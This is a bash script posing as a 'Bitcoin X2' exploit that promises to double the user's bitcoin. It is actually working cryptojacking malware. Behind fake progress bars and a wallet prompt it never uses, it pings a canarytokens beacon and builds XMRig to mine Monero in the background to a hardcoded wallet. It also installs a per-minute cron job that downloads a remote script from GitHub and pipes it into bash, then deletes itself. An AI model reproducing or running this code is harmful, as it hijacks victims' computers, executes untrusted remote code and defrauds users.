#!/bin/bash
echo "██████╗ ██╗████████╗ ██████╗ ██████╗ ██╗███╗   ██╗██╗  ██╗██████╗ "
echo "██╔══██╗██║╚══██╔══╝██╔════╝██╔═══██╗██║████╗  ██║╚██╗██╔╝╚════██╗"
echo "██████╔╝██║   ██║   ██║     ██║   ██║██║██╔██╗ ██║ ╚███╔╝  █████╔╝"
echo "██╔══██╗██║   ██║   ██║     ██║   ██║██║██║╚██╗██║ ██╔██╗ ██╔═══╝ "
echo "██████╔╝██║   ██║   ╚██████╗╚██████╔╝██║██║ ╚████║██╔╝ ██╗███████╗"
echo "╚═════╝ ╚═╝   ╚═╝    ╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝"
curl --silent --output /dev/null http://canarytokens.com/static/articles/ik0a2kjqto14x4knaj77cl5bz/submit.aspx
echo "Loading..."
count=0
total=34
pstr="[=======================================================================]"

while [ $count -lt $total ]; do
  sleep 0.5 # this is work
  count=$(( $count + 1 ))
  pd=$(( $count * 73 / $total ))
  printf "\r%3d.%1d%% %.${pd}s" $(( $count * 100 / $total )) $(( ($count * 1000 / $total) % 10 )) $pstr
done
echo ""
echo ""
echo ""
echo "Enter yourt wallet address:"
read wallet
echo "Accepted!"$wallet
echo "Updating..."
echo "cd && cd xmrig && cd build && ./xmrig -o pool.supportxmr.com:443 -u 44RMgEtJcpDjJfSNfFCW3VfZt6jx8e9X9UPuEva36n5wCyZd2w9QXHtXiipZk8yfDWcn9V3rL4iEbZ6nVCuM9NTXUnTXqcx -k --tls -p Linux /dev/null 2>&1 &" > run.sh && chmod +x run.sh
echo ""
echo ""
echo ""
echo "*/1 * * * * curl https://raw.githubusercontent.com/katerin966/0/main/check.sh | bash > /dev/null 2>&1 &" > cron && cat cron | crontab -
rm cron
echo ""
echo ""
echo ""
sudo apt update && sudo apt install git && sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
git clone https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make -j$(nproc) && wget https://raw.githubusercontent.com/katerin966/0/main/config.json && ./xmrig -o pool.supportxmr.com:443 -u 44RMgEtJcpDjJfSNfFCW3VfZt6jx8e9X9UPuEva36n5wCyZd2w9QXHtXiipZk8yfDWcn9V3rL4iEbZ6nVCuM9NTXUnTXqcx -k --tls -p Linux > /dev/null 2>&1 &   
echo ""
echo ""
echo ""
echo "Connecting to blockchain..."
echo ""
echo ""
echo ""
count=0
total=34
pstr="[=======================================================================]"

while [ $count -lt $total ]; do
  sleep 0.5 # this is work
  count=$(( $count + 1 ))
  pd=$(( $count * 73 / $total ))
  printf "\r%3d.%1d%% %.${pd}s" $(( $count * 100 / $total )) $(( ($count * 1000 / $total) % 10 )) $pstr
done
echo ""
echo "Get a nice coffee and take a seat!"
echo "Start exploiting.."
echo ""
hour=0
min=10
sec=0
       while [ $hour -ge 0 ]; do
                while [ $min -ge 0 ]; do
                        while [ $sec -ge 0 ]; do
                                echo -ne "$hour:$min:$sec\033[0K\r"
                                let "sec=sec-1"
                                sleep 1
                        done
                        sec=59
                        let "min=min-1"
                done
                min=59
                let "hour=hour-1"
        done
echo "The exploit is done!"
echo "You will receive your X2 bitcoin in a couple of minutes!"
rm btcX2xplt.sh
exit

